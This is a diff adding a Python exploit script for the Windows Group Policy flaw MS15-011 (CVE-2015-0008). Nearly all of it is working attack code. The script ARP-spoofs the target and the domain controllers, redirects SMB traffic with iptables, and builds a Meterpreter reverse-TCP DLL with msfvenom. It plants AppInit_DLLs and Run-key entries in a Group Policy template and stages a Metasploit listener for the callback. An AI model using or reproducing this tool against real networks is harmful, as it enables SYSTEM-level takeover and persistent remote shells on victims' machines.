@@ -1,0 +1,152 @@
+# Exploit Title: Microsoft Windows Server 2012 - 'Group Policy' Remote Code Execution
+# Date: 2019-10-28
+# Exploit Author: Thomas Zuk
+# Version: Windows Server 2003, Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows 8, Windows Server 2012, 
+# Windows RT, Windows 8.1, Windows Server 2012 R2, and Windows RT 8.1
+# Tested on: Windows 7 , Windows Server 2012
+# CVE : CVE-2015-0008
+# Type: Remote
+# Platform: Windows
+
+# Description: While there exists multiple advisories for the vulnerability and video demos of 
+# successful exploitation there is no public exploit-code for MS15-011 (CVE-2015-0008). This exploit code 
+# targets vulnerable systems in order to modify registry keys to disable SMB signing, achieve SYSTEM level 
+# remote code execution (AppInit_DLL) and a user level remote code execution (Run Keys).
+
+#!/usr/bin/python3
+
+import argparse
+import os
+import subprocess
+import socket
+import fcntl
+import struct
+
+# MS15-011 Exploit.
+# For more information and any updates/additions this exploit see the following Git Repo: https://github.com/Freakazoidile/Exploit_Dev/tree/master/MS15-011
+# Example usage: python3 ms15-011.py -t 172.66.10.2 -d 172.66.10.10 -i eth1
+# Example usage with multiple DC's: python3 ms15-011.py -t 172.66.10.2 -d 172.66.10.10 -d 172.66.10.11 -d 172.66.10.12 -i eth1
+# Questions @Freakazoidile on twitter or make an issue on the GitHub repo. Enjoy.
+
+def arpSpoof(interface, hostIP, targetIP):
+    arpCmd = "arpspoof -i %s %s %s " % (interface, hostIP, targetIP)
+    arpArgs = arpCmd.split()
+    print("Arpspoofing: %s" % (arpArgs))
+    p = subprocess.Popen(arpArgs, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+
+    
+def karmaSMB(hostIP):
+    print("reverting GptTmpl.inf from bak")
+    os.system("cp GptTmpl.inf.bak GptTmpl.inf")
+    appInit = 'MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs=1,"\\\\%s\\SYSVOL\\share.dll"\r\n' % (hostIP)
+    CURunKey = 'MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Key=1,"rundll32.exe \\\\%s\\SYSVOL\\share.dll",1\r\n' % (hostIP)
+    f = open("GptTmpl.inf","a", encoding='utf-16le')
+    f.write(appInit)
+    f.write(CURunKey)
+    f.close()
+    
+    path = os.getcwd()
+    
+    fConfig = open("smb.conf","w")
+    fConfig.write("ini = "+path+"/gpt.ini\ninf = "+path+"/GptTmpl.inf\ndll = "+path+"/shell.dll\n")
+    fConfig.close()
+
+    karmaCmd = "python karmaSMB.py -config smb.conf -smb2support ./ "
+    os.system(karmaCmd)
+
+
+def iptables_config(targetIP, hostIP):
+    print('[+] Running command: echo "1" > /proc/sys/net/ipv4/ip_forward')
+    print('[+] Running command: iptables -t nat -A PREROUTING -p tcp -s %s --destination-port 445 -j DNAT --to-destination %s' % (targetIP, hostIP))
+    print('[+] Running command: iptables -t nat -A PREROUTING -p tcp -s %s --destination-port 139 -j DNAT --to-destination %s' % (targetIP, hostIP))
+    print('[+] Running command: iptables -t nat -A POSTROUTING -j MASQUERADE')
+    os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
+    os.system('iptables -t nat -A PREROUTING -p tcp -s %s --destination-port 445 -j DNAT --to-destination %s' % (targetIP, hostIP))
+    os.system('iptables -t nat -A PREROUTING -p tcp -s %s --destination-port 139 -j DNAT --to-destination %s' % (targetIP, hostIP))
+    os.system('iptables -t nat -A POSTROUTING -j MASQUERADE')
+
+
+def get_interface_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', bytes(ifname[:15], 'utf-8')))[20:24])
+
+def generatePayload(lhost, lport):
+    print("generating payload(s) and metasploit resource file")
+    msfDll = "msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=%s lport=%s -f dll -o shell.dll" % (lhost, lport)
+    os.system(msfDll)
+    msfResource = "use multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset lhost %s\nset lport %s\nset exitonsession false\nexploit -j\n" % (lhost, lport)
+    print("metasploit resource script: %s" % msfResource)
+    print ("metasploit resource script written to meta_resource.rc type 'msfconsole -r meta_resource.rc' to launch metasploit and stage a listener automatically")
+    
+    file = open("meta_resource.rc", "w+")
+    file.write(msfResource)
+    file.close()
+        
+
+
+if __name__ == '__main__':
+
+    parser = argparse.ArgumentParser()
+
+    # Add arguments
+    parser.add_argument("-t", "--target_ip", help="The IP of the target machine vulnerable to ms15-011/14", required=True)
+    parser.add_argument("-d", "--domain_controller", help="The IP of the domain controller(s) in the target domain. Use this argument multiple times when multiple domain contollers are preset.\nE.G: -d 172.66.10.10 -d 172.66.10.11", action='append', required=True)
+    parser.add_argument("-i", "--interface", help="The interface to use. E.G eth0", required=True)
+    parser.add_argument("-l", "--lhost", help="The IP to listen for incoming connections on for reverse shell. This is optional, uses the IP from the provided interface by default. E.G 192.168.5.1", required=False)
+    parser.add_argument("-p", "--lport", help="The port to listen connections on for reverse shell. If not specified 4444 is used. E.G 443", required=False)
+
+    args = parser.parse_args()
+
+    # Check for KarmaSMB and GptTmpl.inf.bak, if missing download git repo with these files.
+    print ("checking for missing file(s)")
+    if not os.path.isfile("karmaSMB.py") and not os.path.isfile("GptTmpl.inf.bak"):
+        print("Requirements missing. Downloading required files from github")
+        os.system("git clone https://github.com/Freakazoidile/MS15-011-Files")
+        os.system("mv MS15-011-Files/* . && rm -rf MS15-011-Files/")
+
+    # Get the provided interfaces IP address
+    ipAddr = get_interface_address(args.interface)
+
+    if args.lhost is not None:
+        lhost = args.lhost
+    else:
+        lhost = ipAddr
+
+    if args.lport is not None:
+        lport = args.lport
+    else:
+        lport = '4444'
+    
+
+    dcSpoof = ""
+    dcCommaList = ""
+    count = 0
+  
+    # loop over the domain controllers, poison each and target the host IP
+    # create a comma separated list of DC's
+    # create a "-t" separate list of DC's for use with arpspoof
+    for dc in args.domain_controller:
+        dcSpoof += "-t %s " % (dc)
+        if count > 0: 
+            dcCommaList += ",%s" % (dc)
+        else:
+            dcCommaList += "%s" % (dc)
+
+        arpSpoof(args.interface, dc, "-t %s" % (args.target_ip))
+        count += 1
+
+    # arpspoof the target and all of the DC's
+    arpSpoof(args.interface, args.target_ip, dcSpoof)
+
+    # generate payloads
+    generatePayload(lhost, lport)
+
+    # Setup iptables forwarding rules
+    iptables_config(args.target_ip, ipAddr)
+
+    #run Karmba SMB Server
+    karmaSMB(ipAddr)
+   
+    
+    print("Targeting %s by arp spoofing %s and domain controllers: %s " % (args.target_ip, args.target_ip, args.domain_controllers))
+    print("If you interupt/stop the exploit ensure you stop all instances of arpspoof and flush firewall rules!")
